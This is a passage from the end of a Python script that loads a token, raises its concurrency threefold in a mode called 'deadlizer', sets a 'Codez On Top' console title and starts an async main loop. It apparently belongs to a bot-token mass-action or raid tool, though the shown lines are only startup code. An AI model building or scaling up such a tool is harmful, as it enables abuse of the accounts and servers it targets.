    print("\n" + format_log_message("INFO", "Exiting... Goodbye!", 40))
    os._exit(0)

token = __config__["token"]
__max_concurrent__ = __config__.get("max_concurrent", 50)
if __mode__ == "deadlizer":
    __max_concurrent__ *= 3

os.system("cls") if os.name == "nt" else os.system("clear")

if __name__ == "__main__":
    try:
        if os.name == "nt":
            os.system("title Codez On Top")
        asyncio.run(on_ready_mock())
    except KeyboardInterrupt:
        print("\n" + format_log_message("INFO", "Exiting... Goodbye!", 40))
        os._exit(0)
    except Exception as e:
        print(format_log_message("ERROR", f"Failed to start | {e}", 47))
        os._exit(1)
